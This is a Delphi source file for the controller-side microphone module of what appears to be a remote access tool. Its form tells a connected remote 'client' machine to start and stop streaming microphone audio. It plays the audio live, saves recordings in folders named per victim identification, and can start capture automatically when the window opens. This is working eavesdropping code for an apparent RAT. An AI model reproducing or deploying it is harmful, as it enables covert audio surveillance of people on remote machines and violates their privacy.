unit UnitMicrophone;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, UnitConnection, IniFiles, StdCtrls, ComCtrls, Menus, ExtCtrls,
  IdTCPServer, UnitMain, ACMConvertor, ACMout, MMSystem;

type
  TFormMicrophone = class(TForm)
    rg2: TRadioGroup;
    rg1: TRadioGroup;
    pm1: TPopupMenu;
    P1: TMenuItem;
    S1: TMenuItem;
    N2: TMenuItem;
    O1: TMenuItem;
    D1: TMenuItem;
    lv1: TListView;
    dlgSave1: TSaveDialog;
    dlgOpen1: TOpenDialog;
    chk1: TCheckBox;
    btn1: TButton;
    procedure lv1ContextPopup(Sender: TObject; MousePos: TPoint;
      var Handled: Boolean);
    procedure P1Click(Sender: TObject);
    procedure S1Click(Sender: TObject);
    procedure D1Click(Sender: TObject);
    procedure O1Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormCreate(Sender: TObject);
    procedure btn1Click(Sender: TObject);
    procedure FormShow(Sender: TObject);
  protected
    procedure CreateParams(var Params: TCreateParams) ; override;
  private
    { Private declarations }
    Client: PConnectionDatas;
    ACMC: TACMConvertor;    
    ACMO: TACMOut;
  public
    { Public declarations }
    constructor Create(aOwner: TComponent; ConnDatas: PConnectionDatas);
    procedure OnRead(AThread: TIdPeerThread; ReceivedDatas: string);
  end;

var
  FormMicrophone: TFormMicrophone;

implementation
    
uses
  UnitConstants, UnitRepository, UnitFunctions, UnitStringCompression;
    
type
  TAudioRecord = class(TObject)
    _Record: string;
  end;

{$R *.dfm}
       
constructor TFormMicrophone.Create(aOwner: TComponent; ConnDatas: PConnectionDatas);
begin
  inherited Create(aOwner);
  Client := ConnDatas;
end;

procedure TFormMicrophone.CreateParams(var Params: TCreateParams) ;
begin
  inherited;
  Params.ExStyle := Params.ExStyle or WS_EX_APPWINDOW;
  Params.WndParent := 0;
end;

procedure TFormMicrophone.OnRead(AThread: TIdPeerThread; ReceivedDatas: string);
var
  AudioRecord: TAudioRecord;
  TmpItem: TListItem;
begin
  if ReceivedDatas = '' then Exit;
  if chk1.Checked then ACMO.Play(Pointer(ReceivedDatas)^, Length(ReceivedDatas));

  AudioRecord := TAudioRecord.Create;
  AudioRecord._Record := ReceivedDatas;
  TmpItem := lv1.Items.Add;
  TmpItem.Caption := IntToStr(lv1.Items.Count);
  TmpItem.SubItems.Add(FileSizeToStr(Length(ReceivedDatas)));
  TmpItem.SubItems.AddObject(TimeToStr(Time), TObject(AudioRecord));
end;

procedure TFormMicrophone.lv1ContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: Boolean);
var
  i: Integer;
begin
  if not Assigned(lv1.Selected) then
  begin
    for i := 0 to pm1.Items.Count - 1 do pm1.Items[i].Enabled := False;
    pm1.Items[3].Visible := True;
  end
  else for i := 0 to pm1.Items.Count - 1 do pm1.Items[i].Enabled := True;
end;

procedure TFormMicrophone.P1Click(Sender: TObject);
var
  AudioRecord: TAudioRecord;
  TmpStr: string;
  i: Integer;
begin
  for i := 0 to lv1.Items.Count - 1 do
  begin
    Application.ProcessMessages;
    if lv1.Items.Item[i].Selected = True then
    begin
      AudioRecord := TAudioRecord(lv1.Items.Item[i].SubItems.Objects[1]);
      TmpStr := AudioRecord._Record;
      ACMO.Play(Pointer(TmpStr)^, Length(TmpStr));
    end;
  end;
end;

procedure TFormMicrophone.S1Click(Sender: TObject);
var
  TmpStr: string;
  i: Integer;
begin
  TmpStr := GetMicrophoneFolder(Client.Identification);
  dlgSave1.Title := PROGRAMNAME + ' ' + PROGRAMVERSION;
  dlgSave1.InitialDir := TmpStr;
  dlgSave1.FileName := 'Record_' + MyGetTime('') + '.audio';
  dlgSave1.Filter := 'Audio record file (*.audio)|*.audio';
  dlgSave1.DefaultExt := 'audio';
  if (not dlgSave1.Execute) and (not FileExists(dlgSave1.FileName)) then Exit;

  for i := 0 to lv1.Items.Count - 1 do
  begin
    if lv1.Items.Item[i].Selected = True then
    begin
      TmpStr := TmpStr + lv1.Items.Item[i].Caption + '|' +
                lv1.Items.Item[i].SubItems[0] + '|' +
                lv1.Items.Item[i].SubItems[1] + '|' +
                TAudioRecord(lv1.Items.Item[i].SubItems.Objects[1])._Record + '|' + #13#10;
    end;
  end;

  TmpStr := CompressString(TmpStr);
  CreateTextFile(dlgSave1.FileName, TmpStr);
end;

procedure TFormMicrophone.D1Click(Sender: TObject);
var
  i: Integer;
begin
  for i := 0 to lv1.Items.Count - 1 do
  if lv1.Items.Item[i].Selected = True then lv1.Items.Item[i].Delete;
end;

procedure TFormMicrophone.O1Click(Sender: TObject);
var
  TmpStr, TmpStr1: string;
  TmpItem: TListItem;
  i: Integer;
  Stream: TMemoryStream;
  AudioRecord: TAudioRecord;
  TmpsList, TmpsList1: TStringList;
begin
  TmpStr := GetMicrophoneFolder(Client.Identification);
  dlgOpen1.Title := PROGRAMNAME + ' ' + PROGRAMVERSION;
  dlgOpen1.InitialDir := TmpStr;
  dlgOpen1.Filter := 'Audio record file (*.audio)|*.audio';
  dlgOpen1.DefaultExt := 'audio';
  if (not dlgOpen1.Execute) and (not FileExists(dlgOpen1.FileName)) then Exit;

  lv1.Items.Clear;

  Stream := TMemoryStream.Create;
  Stream.LoadFromFile(dlgOpen1.FileName);
  Stream.Position := 0;
  TmpStr := StreamToStr(Stream);
  Stream.Free;

  TmpStr := DecompressString(TmpStr);

  while TmpStr <> '' do
  begin
    TmpItem := lv1.Items.Add;
    TmpItem.Caption := Copy(TmpStr, 1, Pos('|', TmpStr)-1);
    Delete(TmpStr, 1, Pos('|', TmpStr));
    TmpItem.SubItems.Add(Copy(TmpStr, 1, Pos('|', TmpStr)-1));
    Delete(TmpStr, 1, Pos('|', TmpStr));

    TmpStr1 := Copy(TmpStr, 1, Pos('|', TmpStr)-1);
    Delete(TmpStr, 1, Pos('|', TmpStr));

    AudioRecord := TAudioRecord.Create;
    AudioRecord._Record := Copy(TmpStr, 1, Pos('|', TmpStr)-1);
    Delete(TmpStr, 1, Pos('|', TmpStr));
    Delete(TmpStr, 1, 2);

    TmpItem.SubItems.AddObject(TmpStr1, TObject(AudioRecord));
  end;
end;
    
procedure TFormMicrophone.btn1Click(Sender: TObject);
var
  Format: TWaveFormatEx;
  Channel, Sample: Integer;
begin
  if btn1.Caption = 'Start streaming' then
  begin
    btn1.Caption := 'Stop streaming';

    case rg2.ItemIndex of
      0:  Channel := 2;
      1:  Channel := 1;
    end;

    case rg1.ItemIndex of
      0:  Sample := 48000;
      1:  Sample := 44100;
      2:  Sample := 22100;
      3:  Sample := 11050;
      4:  Sample := 8000;
    end;

    Format.nChannels := Channel;
    Format.nSamplesPerSec := Sample;
    Format.wBitsPerSample := 16;
    Format.nAvgBytesPerSec := Format.nSamplesPerSec * Format.nChannels * 2;
    Format.nBlockAlign := Format.nChannels * 2;
    ACMC.FormatIn.Format.nChannels := Format.nChannels;
    ACMC.FormatIn.Format.nSamplesPerSec := Format.nSamplesPerSec;
    ACMC.FormatIn.Format.nAvgBytesPerSec := Format.nAvgBytesPerSec;
    ACMC.FormatIn.Format.nBlockAlign := Format.nBlockAlign;
    ACMC.FormatIn.Format.wBitsPerSample := Format.wBitsPerSample;
    SendDatas(Client.AThread, MICROPHONESTART + '|' +
              IntToStr(Channel) + '|' + IntToStr(Sample));
  end
  else
  begin
    btn1.Caption := 'Start streaming';
    SendDatas(Client.AThread, MICROPHONESTOP + '|');
  end;
end;

procedure TFormMicrophone.FormClose(Sender: TObject;
  var Action: TCloseAction);
var
  IniFile: TIniFile;
  TmpStr: string;
begin
  if btn1.Caption = 'Stop streaming' then btn1.Click;

  TmpStr := ExtractFilePath(ParamStr(0)) + 'Settings.ini';
  IniFile := TIniFile.Create(TmpStr);
  IniFile.WriteInteger('Microphone', 'Left', Left);
  IniFile.WriteInteger('Microphone', 'Top', Top);  
  IniFile.WriteInteger('Microphone', 'Width', Width);
  IniFile.WriteInteger('Microphone', 'Height', Height);  
  IniFile.WriteInteger('Microphone', 'Sample rate', rg1.ItemIndex);
  IniFile.WriteInteger('Microphone', 'Channel', rg2.ItemIndex);
  IniFile.WriteBool('Microphone', 'Autoplay', chk1.Checked);
  IniFile.Free;
end;

procedure TFormMicrophone.FormCreate(Sender: TObject);
var
  TmpStr: string;
  IniFile: TIniFile;
begin
  TmpStr := ExtractFilePath(ParamStr(0)) + 'Settings.ini';
  IniFile := TIniFile.Create(TmpStr);
  Left := IniFile.ReadInteger('Microphone', 'Left', 283);
  Top := IniFile.ReadInteger('Microphone', 'Top', 89);
  Width := IniFile.ReadInteger('Microphone', 'Width', 528);
  Height := IniFile.ReadInteger('Microphone', 'Height', 416);
  rg1.ItemIndex := IniFile.ReadInteger('Microphone', 'Sample rate', 0);
  rg2.ItemIndex := IniFile.ReadInteger('Microphone', 'Channel', 0);
  chk1.Checked := IniFile.ReadBool('Microphone', 'Autoplay', True);
  IniFile.Free;

  ACMO := TACMOut.Create(nil);
  ACMC := TACMConvertor.Create;
  ACMO.NumBuffers := 0;
  ACMO.Open(ACMC.FormatIn);
end;

procedure TFormMicrophone.FormShow(Sender: TObject);
begin
  if AutoStartMic then btn1.Click;
end;

end.
